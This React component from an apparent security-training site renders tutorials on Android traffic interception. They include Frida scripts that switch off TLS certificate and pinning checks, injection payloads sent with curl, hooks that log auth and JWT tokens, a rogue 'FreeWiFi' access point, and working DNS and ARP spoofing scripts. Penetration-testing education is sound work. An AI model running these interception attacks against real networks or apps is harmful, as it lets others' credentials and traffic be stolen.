
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Network, Shield, Lock, Eye, Zap } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const AndroidNetworkAnalysis: React.FC = () => {
  return (
    <div className="space-y-6">
      <Card className="bg-cybr-card border-cybr-muted">
        <CardHeader>
          <CardTitle className="text-cybr-primary flex items-center gap-2">
            <Network className="h-6 w-6" />
            Network Analysis - Traffic Interception & Analysis
          </CardTitle>
        </CardHeader>
        <CardContent>
          <Tabs defaultValue="traffic-interception" className="w-full">
            <TabsList className="grid grid-cols-5 w-full mb-6">
              <TabsTrigger value="traffic-interception">Traffic Interception</TabsTrigger>
              <TabsTrigger value="ssl-pinning-bypass">SSL Pinning Bypass</TabsTrigger>
              <TabsTrigger value="api-testing">API Testing</TabsTrigger>
              <TabsTrigger value="protocol-analysis">Protocol Analysis</TabsTrigger>
              <TabsTrigger value="network-attacks">Network Attacks</TabsTrigger>
            </TabsList>

            <TabsContent value="traffic-interception" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">HTTP/HTTPS Traffic Interception</h3>
              
              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">Burp Suite Setup</h4>
                <CodeExample
                  language="bash"
                  title="Burp Suite Configuration for Android"
                  code={`# Configure device proxy settings
adb shell settings put global http_proxy 192.168.1.100:8080

# Configure WiFi proxy via ADB
adb shell am start -a android.intent.action.MAIN -n com.android.settings/.wifi.WifiSettings

# Install Burp certificate
# 1. Browse to http://burp on device
# 2. Download CA certificate
# 3. Convert and install to system store

# Convert certificate format
openssl x509 -inform DER -in cacert.der -out cacert.pem
openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1
mv cacert.pem 9a5ba575.0

# Install to system certificate store
adb push 9a5ba575.0 /sdcard/
adb shell "su -c 'mount -o remount,rw /system'"
adb shell "su -c 'cp /sdcard/9a5ba575.0 /system/etc/security/cacerts/'"
adb shell "su -c 'chmod 644 /system/etc/security/cacerts/9a5ba575.0'"
adb shell "su -c 'chown root:root /system/etc/security/cacerts/9a5ba575.0'"
adb shell reboot`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">OWASP ZAP Configuration</h4>
                <CodeExample
                  language="bash"
                  title="ZAP Proxy Setup for Mobile Testing"
                  code={`# Start ZAP in daemon mode
zap.sh -daemon -host 0.0.0.0 -port 8080

# Generate and export certificate
curl -k -X GET "http://localhost:8080/OTHER/core/other/rootcert/" > zap_cert.der

# Convert certificate
openssl x509 -inform DER -in zap_cert.der -out zap_cert.pem
openssl x509 -inform PEM -subject_hash_old -in zap_cert.pem | head -1
cp zap_cert.pem $(openssl x509 -inform PEM -subject_hash_old -in zap_cert.pem | head -1).0

# Install certificate
adb push $(openssl x509 -inform PEM -subject_hash_old -in zap_cert.pem | head -1).0 /sdcard/
adb shell "su -c 'cp /sdcard/$(openssl x509 -inform PEM -subject_hash_old -in zap_cert.pem | head -1).0 /system/etc/security/cacerts/'"

# Configure device proxy
adb shell settings put global http_proxy 192.168.1.100:8080`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">mitmproxy Setup</h4>
                <CodeExample
                  language="bash"
                  title="mitmproxy for Advanced Traffic Analysis"
                  code={`# Install mitmproxy
pip install mitmproxy

# Start mitmproxy with web interface
mitmweb --listen-host 0.0.0.0 --listen-port 8080

# Start with custom script
mitmdump -s custom_script.py --listen-host 0.0.0.0 --listen-port 8080

# Certificate installation
# Download from http://mitm.it on device
wget http://mitm.it/cert/pem -O mitmproxy-ca-cert.pem

# Convert for Android
openssl x509 -inform PEM -subject_hash_old -in mitmproxy-ca-cert.pem | head -1
cp mitmproxy-ca-cert.pem $(openssl x509 -inform PEM -subject_hash_old -in mitmproxy-ca-cert.pem | head -1).0

# Install certificate
adb push $(openssl x509 -inform PEM -subject_hash_old -in mitmproxy-ca-cert.pem | head -1).0 /sdcard/
adb shell "su -c 'cp /sdcard/$(openssl x509 -inform PEM -subject_hash_old -in mitmproxy-ca-cert.pem | head -1).0 /system/etc/security/cacerts/'"`}
                />
              </div>
            </TabsContent>

            <TabsContent value="ssl-pinning-bypass" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">SSL Certificate Pinning Bypass</h3>
              
              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">Universal SSL Kill Switch</h4>
                <CodeExample
                  language="javascript"
                  title="Frida Script for Universal SSL Bypass"
                  code={`Java.perform(function() {
    console.log("[+] Starting SSL Kill Switch");
    
    // Bypass TrustManager
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var HostnameVerifier = Java.use("javax.net.ssl.HostnameVerifier");
    var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    // Create custom TrustManager
    var TrustManager = Java.registerClass({
        name: "com.generated.TrustManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() {
                return [];
            }
        }
    });
    
    // Create custom HostnameVerifier
    var HostnameVerifier = Java.registerClass({
        name: "com.generated.HostnameVerifier",
        implements: [HostnameVerifier],
        methods: {
            verify: function(hostname, session) {
                return true;
            }
        }
    });
    
    // Get default SSL context and modify it
    var context = SSLContext.getInstance("TLS");
    context.init(null, [TrustManager.$new()], null);
    
    // Set default SSL socket factory
    HttpsURLConnection.setDefaultSSLSocketFactory(context.getSocketFactory());
    HttpsURLConnection.setDefaultHostnameVerifier(HostnameVerifier.$new());
    
    console.log("[+] SSL Kill Switch activated");
});`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">OkHttp3 Pinning Bypass</h4>
                <CodeExample
                  language="javascript"
                  title="OkHttp3 Certificate Pinning Bypass"
                  code={`Java.perform(function() {
    // Bypass OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log("[+] OkHttp3 Certificate pinning bypassed for: " + hostname);
            return;
        };
        console.log("[+] OkHttp3 CertificatePinner bypass enabled");
    } catch(err) {
        console.log("[-] OkHttp3 CertificatePinner not found");
    }
    
    // Bypass OkHttp3 hostname verification
    try {
        var OkHostnameVerifier = Java.use("okhttp3.internal.tls.OkHostnameVerifier");
        OkHostnameVerifier.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function(hostname, session) {
            console.log("[+] OkHttp3 hostname verification bypassed for: " + hostname);
            return true;
        };
    } catch(err) {
        console.log("[-] OkHostnameVerifier not found");
    }
    
    // Bypass TrustManagerImpl
    try {
        var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log("[+] TrustManagerImpl verification bypassed for: " + host);
            return untrustedChain;
        };
    } catch(err) {
        console.log("[-] TrustManagerImpl not found");
    }
});`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">Network Security Config Bypass</h4>
                <CodeExample
                  language="javascript"
                  title="Network Security Configuration Bypass"
                  code={`Java.perform(function() {
    // Bypass Network Security Config
    try {
        var NetworkSecurityPolicy = Java.use("android.security.NetworkSecurityPolicy");
        NetworkSecurityPolicy.getInstance.implementation = function() {
            console.log("[+] NetworkSecurityPolicy.getInstance() called");
            
            var policy = this.getInstance();
            
            // Hook isCleartextTrafficPermitted
            policy.isCleartextTrafficPermitted.overload('java.lang.String').implementation = function(hostname) {
                console.log("[+] Cleartext traffic permitted for: " + hostname);
                return true;
            };
            
            // Hook isCertificateTransparencyVerificationRequired
            policy.isCertificateTransparencyVerificationRequired.implementation = function(hostname) {
                console.log("[+] Certificate transparency verification bypassed for: " + hostname);
                return false;
            };
            
            return policy;
        };
    } catch(err) {
        console.log("[-] NetworkSecurityPolicy not found: " + err);
    }
    
    // Bypass WebView SSL errors
    try {
        var WebViewClient = Java.use("android.webkit.WebViewClient");
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            console.log("[+] WebView SSL error bypassed");
            handler.proceed();
        };
    } catch(err) {
        console.log("[-] WebViewClient not found");
    }
});`}
                />
              </div>
            </TabsContent>

            <TabsContent value="api-testing" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">API Security Testing</h3>
              
              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">REST API Testing</h4>
                <CodeExample
                  language="bash"
                  title="API Endpoint Discovery and Testing"
                  code={`# Extract API endpoints from APK
strings app.apk | grep -E "https?://[^/]+/[^?#\\s]*" | sort -u > api_endpoints.txt

# Test for common API vulnerabilities
for endpoint in $(cat api_endpoints.txt); do
    echo "Testing: $endpoint"
    
    # Test for directory traversal
    curl -k "$endpoint/../../../etc/passwd"
    
    # Test for SQL injection
    curl -k "$endpoint?id=1' OR '1'='1"
    
    # Test for XSS
    curl -k "$endpoint?param=<script>alert(1)</script>"
    
    # Test for command injection
    curl -k "$endpoint?cmd=;ls"
done

# Use Burp Suite's active scanner
# 1. Capture API traffic
# 2. Send to Intruder for parameter fuzzing
# 3. Use active scanner for automated testing

# Test rate limiting
for i in {1..100}; do
    curl -k "https://api.example.com/endpoint" &
done`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">Authentication Testing</h4>
                <CodeExample
                  language="javascript"
                  title="API Authentication Analysis"
                  code={`Java.perform(function() {
    // Monitor API authentication
    var HttpURLConnection = Java.use("java.net.HttpURLConnection");
    
    HttpURLConnection.setRequestProperty.implementation = function(key, value) {
        if (key.toLowerCase().includes("authorization") || 
            key.toLowerCase().includes("token") ||
            key.toLowerCase().includes("auth")) {
            console.log("[+] Auth header: " + key + " = " + value);
        }
        
        this.setRequestProperty(key, value);
    };
    
    // Monitor OAuth tokens
    var Intent = Java.use("android.content.Intent");
    Intent.putExtra.overload('java.lang.String', 'java.lang.String').implementation = function(key, value) {
        if (key.toLowerCase().includes("token") || 
            key.toLowerCase().includes("oauth") ||
            key.toLowerCase().includes("auth")) {
            console.log("[+] OAuth token: " + key + " = " + value);
        }
        
        return this.putExtra(key, value);
    };
    
    // Monitor JWT tokens
    var String = Java.use("java.lang.String");
    String.split.overload('java.lang.String').implementation = function(regex) {
        var result = this.split(regex);
        
        // Check if this looks like a JWT
        if (this.toString().includes(".") && this.toString().length > 100) {
            var parts = this.toString().split(".");
            if (parts.length === 3) {
                console.log("[+] Potential JWT token found: " + this.toString());
                
                // Decode JWT payload
                try {
                    var payload = Java.use("android.util.Base64").decode(parts[1], 0);
                    var payloadStr = String.$new(payload);
                    console.log("[+] JWT payload: " + payloadStr);
                } catch(e) {
                    console.log("[-] Failed to decode JWT payload");
                }
            }
        }
        
        return result;
    };
});`}
                />
              </div>
            </TabsContent>

            <TabsContent value="protocol-analysis" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Protocol Analysis</h3>
              
              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">WebSocket Analysis</h4>
                <CodeExample
                  language="javascript"
                  title="WebSocket Traffic Monitoring"
                  code={`Java.perform(function() {
    // Hook WebSocket connections
    try {
        var WebSocket = Java.use("okhttp3.WebSocket");
        var WebSocketListener = Java.use("okhttp3.WebSocketListener");
        
        // Hook WebSocket creation
        var OkHttpClient = Java.use("okhttp3.OkHttpClient");
        OkHttpClient.newWebSocket.implementation = function(request, listener) {
            console.log("[+] WebSocket connection to: " + request.url().toString());
            
            // Create wrapper listener
            var ListenerWrapper = Java.registerClass({
                name: "com.test.WebSocketListenerWrapper",
                implements: [WebSocketListener],
                methods: {
                    onOpen: function(webSocket, response) {
                        console.log("[+] WebSocket opened");
                        listener.onOpen(webSocket, response);
                    },
                    onMessage: function(webSocket, text) {
                        console.log("[+] WebSocket message received: " + text);
                        listener.onMessage(webSocket, text);
                    },
                    onMessage: function(webSocket, bytes) {
                        console.log("[+] WebSocket binary message received");
                        listener.onMessage(webSocket, bytes);
                    },
                    onClosing: function(webSocket, code, reason) {
                        console.log("[+] WebSocket closing: " + code + " - " + reason);
                        listener.onClosing(webSocket, code, reason);
                    },
                    onClosed: function(webSocket, code, reason) {
                        console.log("[+] WebSocket closed: " + code + " - " + reason);
                        listener.onClosed(webSocket, code, reason);
                    },
                    onFailure: function(webSocket, t, response) {
                        console.log("[+] WebSocket failure: " + t.toString());
                        listener.onFailure(webSocket, t, response);
                    }
                }
            });
            
            return this.newWebSocket(request, ListenerWrapper.$new());
        };
        
    } catch(err) {
        console.log("[-] WebSocket hooking failed: " + err);
    }
});`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">Custom Protocol Analysis</h4>
                <CodeExample
                  language="bash"
                  title="Network Traffic Capture and Analysis"
                  code={`# Capture network traffic with tcpdump
adb shell "su -c 'tcpdump -i any -w /sdcard/capture.pcap'"

# Pull capture file
adb pull /sdcard/capture.pcap

# Analyze with Wireshark
wireshark capture.pcap

# Extract specific protocols
tshark -r capture.pcap -Y "tcp.port == 8080" -w http_traffic.pcap
tshark -r capture.pcap -Y "ssl" -w ssl_traffic.pcap

# Network statistics
tshark -r capture.pcap -z conv,tcp -q
tshark -r capture.pcap -z hosts -q

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,extracted_objects/

# Custom protocol analysis with Python
python3 -c "
import scapy.all as scapy
packets = scapy.rdpcap('capture.pcap')
for packet in packets:
    if packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load
        if b'password' in payload or b'token' in payload:
            print(f'Sensitive data found: {payload}')
"`}
                />
              </div>
            </TabsContent>

            <TabsContent value="network-attacks" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Network-Based Attacks</h3>
              
              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">Man-in-the-Middle Attacks</h4>
                <CodeExample
                  language="bash"
                  title="MITM Attack Setup"
                  code={`# Set up rogue access point
# Install hostapd and dnsmasq
sudo apt-get install hostapd dnsmasq

# Configure hostapd
cat > /etc/hostapd/hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Configure dnsmasq
cat > /etc/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.4.1
EOF

# Set up IP forwarding and iptables
echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.conf
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Redirect traffic to proxy
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Start services
systemctl start hostapd
systemctl start dnsmasq`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">DNS Spoofing</h4>
                <CodeExample
                  language="bash"
                  title="DNS Manipulation Attacks"
                  code={`# DNS spoofing with dnsmasq
echo "address=/api.example.com/192.168.4.1" >> /etc/dnsmasq.conf

# DNS spoofing with Ettercap
ettercap -T -i wlan0 -M arp:remote /192.168.4.2// //api.example.com/

# Custom DNS responses
cat > dns_spoof.py << 'EOF'
#!/usr/bin/env python3
from scapy.all import *

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode('utf-8')
        if "api.example.com" in qname:
            print(f"[+] Spoofing DNS query for {qname}")
            
            # Create spoofed response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \\
                         UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \\
                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, 
                                     rdata="192.168.4.1"))
            
            send(spoofed_pkt, verbose=0)
            return "Spoofed"

# Sniff DNS queries
sniff(filter="udp port 53", prn=dns_spoof, iface="wlan0")
EOF

python3 dns_spoof.py`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">ARP Spoofing</h4>
                <CodeExample
                  language="bash"
                  title="ARP Spoofing for Traffic Interception"
                  code={`# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing with ettercap
ettercap -T -i wlan0 -M arp:remote /192.168.4.2// /192.168.4.1//

# ARP spoofing with arpspoof
arpspoof -i wlan0 -t 192.168.4.2 192.168.4.1
arpspoof -i wlan0 -t 192.168.4.1 192.168.4.2

# Custom ARP spoofing script
cat > arp_spoof.py << 'EOF'
#!/usr/bin/env python3
from scapy.all import *
import time
import threading

def arp_spoof(target_ip, gateway_ip, interface):
    # Get MAC addresses
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    if target_mac is None or gateway_mac is None:
        print("[-] Could not resolve MAC addresses")
        return
    
    print(f"[+] Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
    
    try:
        while True:
            # Spoof target
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), 
                 verbose=False, iface=interface)
            
            # Spoof gateway
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), 
                 verbose=False, iface=interface)
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] Stopping ARP spoofing")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, interface)

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), 
         count=3, verbose=False, iface=interface)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), 
         count=3, verbose=False, iface=interface)

if __name__ == "__main__":
    target = "192.168.4.2"  # Android device
    gateway = "192.168.4.1"  # Router
    interface = "wlan0"
    
    arp_spoof(target, gateway, interface)
EOF

python3 arp_spoof.py`}
                />
              </div>
            </TabsContent>
          </Tabs>

          <div className="mt-6 p-4 bg-cybr-muted/20 rounded-lg">
            <h4 className="font-medium text-cybr-accent mb-2">Network Analysis Best Practices</h4>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Always use multiple certificate pinning bypass techniques</li>
              <li>Monitor both HTTP and HTTPS traffic for complete coverage</li>
              <li>Test API endpoints for OWASP API Top 10 vulnerabilities</li>
              <li>Analyze custom protocols and proprietary communication methods</li>
              <li>Document all network communications and data flows</li>
              <li>Test network resilience under various conditions</li>
              <li>Verify that sensitive data is properly encrypted in transit</li>
            </ul>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default AndroidNetworkAnalysis;
